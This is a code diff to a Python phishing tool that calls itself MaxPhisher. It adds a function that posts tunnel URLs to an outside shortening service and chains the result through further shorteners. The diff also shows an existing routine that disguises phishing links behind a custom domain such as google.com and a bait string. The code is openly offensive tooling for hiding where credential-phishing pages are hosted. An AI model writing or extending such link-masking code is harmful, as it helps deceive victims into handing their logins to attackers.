@@ -109,7 +109,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.2.1"
+version="1.2.2"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -200,6 +200,7 @@ for module in modules:
 
 from requests import ( 
     get,
+    post,
     head, 
     Session
 )
@@ -304,6 +305,7 @@ argparser.add_argument("-s", "--duration", type=int, default=default_duration, h
 argparser.add_argument("-m", "--mode", help="Mode of MaxPhisher [Default: normal]")
 argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
+argparser.add_argument("--kshrt", help="Show kshrt url [Default: False]", action="store_true")
 argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
 
 
@@ -324,6 +326,7 @@ mode = args.mode
 troubleshoot = args.troubleshoot
 key = args.nokey if mode != "test" else False
 update = args.noupdate
+kshrt = args.kshrt
 
 local_url = f"127.0.0.1:{port}"
 
@@ -955,6 +958,30 @@ def url_manager(url, tunneler):
     #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
     sleep(0.5)
 
+def kshrten(url):
+    route_map = {
+        ".trycloudflare.com": "cf",
+        ".loclx.io": "lx",
+        ".lhr.life": "lhr",
+        ".lhr.pro": "lhro",
+        ".serveo.net": "svo",
+    }
+    for key in route_map.keys():
+        if key in url:
+            route = route_map[key]
+            subdomain = url.replace("https://", "").replace(key, "")
+    website = f"https://kshrt.vercel.app/{route}/{subdomain}"
+    internet()
+    try:
+        res = post(website).text
+    except Exception as e:
+        append(e, error_file)
+        res = ""
+    shortened = res.split("\n")[0] if "\n" in res else res
+    if "https://" not in shortened:
+        return ""
+    return shortened
+
 def shortener1(url):
     website = "https://is.gd/create.php?format=simple&url="+url.strip()
     internet()
@@ -1066,8 +1093,16 @@ def masking(url):
     elif (shortened:=shortener3(url)) != "":
         pass
     else:
-        sprint(f"{error}Service not available!")
-        waiter()
+        kurl = kshrten(url)
+        if (shortened:=shortener1(kurl)) != "":
+            pass
+        elif (shortened:=shortener2(kurl)) != "":
+            pass
+        elif (shortened:=shortener3(kurl)) != "":
+            pass
+        else:
+            sprint(f"\n{error}Service not available!")
+            waiter()
     short = shortened.replace("https://", "")
     # Remove slash and spaces from inputs
     domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
@@ -1089,6 +1124,17 @@ def masking(url):
     final = domain+bait+short
     print()
     #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
+    if kshrt:
+        kshrt_title = "[bold green]Kshrt[/]"
+        kshrt_text = f"[cyan]URL[/] [blue]:[/] [yellow]{kurl}[/]"
+        cprint(
+            Panel(
+                kshrt_text,
+                title=kshrt_title,
+                title_align="left",
+                border_style="green",
+            )
+        )
     title = "[bold blue]Custom[/]"
     text = f"[cyan]URL[/] [green]:[/] [yellow]{final}[/]"
     cprint(
